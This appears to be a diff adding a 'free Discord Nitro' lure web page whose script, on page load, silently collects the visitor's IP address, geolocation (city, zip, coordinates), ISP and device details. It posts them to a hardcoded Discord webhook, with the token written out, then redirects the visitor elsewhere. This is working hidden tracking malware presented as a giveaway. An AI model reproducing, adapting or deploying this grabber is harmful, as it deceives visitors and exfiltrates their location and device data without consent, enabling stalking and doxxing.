@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FREE NITTRO DISCORD</title>
+  <meta name="description" content="FREE NITRO DISCORD">
+  <meta property="og:title" content="GET NITRO DISCORD">
+  <meta property="og:description" content="FREE NITRO DISCORD">
+  <meta property="og:image" content="https://cdn3.emoji.gg/emojis/1837-evolving-badge-nitro-24-months.png">
+  <meta name="theme-color" content="#f354f3">
+  <meta name="msapplication-navbutton-color" content="#f354f3">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>replit</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+<script>
+  $(document).ready(function () {
+
+    let ip
+    let country
+    let countryCode
+    let region
+    let regionName
+    let city
+    let zip
+    let lat
+    let lon
+    let timezone
+    let org
+    let batterypercentage
+    let ischarging
+    let platform
+    let networkinfo
+    let networkinformation
+    let width
+    let height
+    let devicelang
+    let iscookieEnabled
+    let userAgent
+    let cpuThreads
+    let deviceram
+    let referurl
+    let datetime = new Date();
+    let localtime
+    let dinamycImage
+
+    async function getInfo() {
+      await fetch('https://ip-api.io/json')
+        .then(response => response.json())
+        .then(data => {
+          ip = data.ip
+          country = data.country_name
+          countryCode = data.country_code
+          region = data.region_code
+          regionName = data.region_name
+          city = data.city
+          zip = data.zip_code
+          lat = data.latitude
+          lon = data.longitude
+          timezone = data.time_zone
+          org = data.organisation
+        })
+
+      await fetch('https://nekobot.xyz/api/image?type=hthigh')
+        .then(response => response.json())
+        .then(data => {
+          dinamycImage = data.message;
+          console.log(dinamycImage);
+        })
+
+      let battery = await navigator.getBattery();
+      batterypercentage = String(battery.level * 100 + "%");
+      ischarging = String(battery.charging);
+      platform = String(navigator.platform);
+      width = String(window.innerWidth);
+      height = String(window.innerHeight);
+      devicelang = String(navigator.language);
+      iscookieEnabled = String(navigator.cookieEnabled);
+      userAgent = String(navigator.userAgent || navigator.vendor || window.opera);
+      cpuThreads = String(navigator.hardwareConcurrency);
+      deviceram = String(navigator.deviceMemory + "GB");
+      referurl = String(window.location.href);
+      localtime = String(datetime.toLocaleString());
+
+      await sendWebhook();
+    }
+    getInfo();
+
+    function sendWebhook() {
+      /*Change here the webhookUrl for your discord webhook url*/
+      const webhookUrl = "https://discord.com/api/webhooks/1272332909079957656/xt4xo60U44ULIY9sOKMEQTl-Q_IUTjeIpnNtu7tyjUwdFlTXMo6ztfHCPncHajXW7U5y";
+
+      let request = new XMLHttpRequest();
+      request.open("POST", webhookUrl);
+      request.setRequestHeader('Content-type', 'application/json');
+      let params = {
+        "content": null,
+        "embeds": [{
+          "title": "IP Data",
+          "description": ``,
+          "fields": [{
+            "name": "**IP:**",
+            "value": `${ip}`,
+            "inline": true
+          },
+          {
+            "name": "**Povider:**",
+            "value": `${org}`,
+            "inline": true
+          },
+          {
+            "name": "**Country:**",
+            "value": `${country}`,
+            "inline": true
+          },
+          {
+            "name": "**Code Country:**",
+            "value": `${countryCode}`,
+            "inline": true
+          },
+          {
+            "name": "**Name reg:**",
+            "value": `${regionName}`,
+            "inline": true
+          },
+          {
+            "name": "**Code reg:**",
+            "value": `${region}`,
+            "inline": true
+          },
+          {
+            "name": "**City:**",
+            "value": `${city}`,
+            "inline": true
+          },
+          {
+            "name": "**Zip:**",
+            "value": `${zip}`,
+            "inline": true
+          },
+          {
+            "name": "**Latitud:**",
+            "value": `${lat}`,
+            "inline": true
+          },
+          {
+            "name": "**Longitud:**",
+            "value": `${lon}`,
+            "inline": true
+          },
+          {
+            "name": "**Time zone:**",
+            "value": `${timezone}`,
+            "inline": true
+          },
+          {
+            "name": "**Localtime:**",
+            "value": `${localtime}`,
+            "inline": true
+          },
+          {
+            "name": "**Cookies:**",
+            "value": `${iscookieEnabled}`,
+            "inline": true
+          },
+          {
+            "name": "**Lang:**",
+            "value": `${devicelang}`,
+            "inline": true
+          },
+          {
+            "name": "**Width px:**",
+            "value": `${width}`,
+            "inline": true
+          },
+          {
+            "name": "**Height px:**",
+            "value": `${height}`,
+            "inline": true
+          },
+          {
+            "name": "**Platform:**",
+            "value": `${platform}`,
+            "inline": true
+          },
+          {
+            "name": "Battery:",
+            "value": `${batterypercentage}`,
+            "inline": true
+          },
+          {
+            "name": "Charging",
+            "value": `${ischarging}`,
+            "inline": true
+          },
+          {
+            "name": "CPU Threads",
+            "value": `${cpuThreads}`,
+            "inline": true
+          },
+          {
+            "name": "Ram",
+            "value": `${deviceram}`,
+            "inline": true
+          },
+          {
+            "name": "**Browser:**",
+            "value": `${userAgent}`,
+          },
+          {
+            "name": "Url",
+            "value": `${referurl}`,
+          }
+          ],
+          "color": 0x4d7bf5,
+          "footer": {
+            "text": "",
+            "icon_url": "https://media.discordapp.net/attachments/1215722581823463504/1216346102224126074/B_10.png?ex=66000d95&is=65ed9895&hm=23d57425777371ac660b0f02&=&format=webp&quality=lossless&width=417&height=417"
+          },
+          "image": {
+            "url": ""
+          },
+          "thumbnail": {
+            "url": "https://media.discordapp.net/attachments/1215722581823463504/1216346102224126074/B_10.png?ex=66000d95&is=65ed9895&hm=23d57425777371ac660b0f02&=&format=webp&quality=lossless&width=417&height=417"
+          },
+          "timestamp": datetime
+        }],
+        "attachments": []
+      }
+      request.send(JSON.stringify(params));
+    }
+
+    // Redirect to Discord after 2 seconds
+    setTimeout(function () {
+      window.location.href = "https://venge.io/";
+    }, 1500);
+
+  });
+</script>
+
+</html>
